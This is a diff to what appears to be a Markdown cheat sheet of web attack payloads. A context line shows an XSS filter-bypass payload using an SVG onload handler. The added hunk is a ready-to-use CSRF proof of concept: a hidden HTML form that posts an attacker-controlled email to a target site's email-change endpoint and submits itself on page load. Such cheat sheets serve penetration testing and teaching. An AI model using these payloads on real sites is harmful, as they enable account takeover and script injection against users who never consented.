@@ -58,3 +58,11 @@ Simple bypasses / non blind:
 ```html
 1"Onxx=><Svg/Onload=alert(1)//
 ```
+
+Simple CSRF:
+```html
+<form action="https://$TARGET_WEB/email/change" method="POST">
+	<input type="hidden" name="email" value="$ATTACKER_EMAIL" />
+</form>
+<script> document.forms[0].submit(); </script>
+```
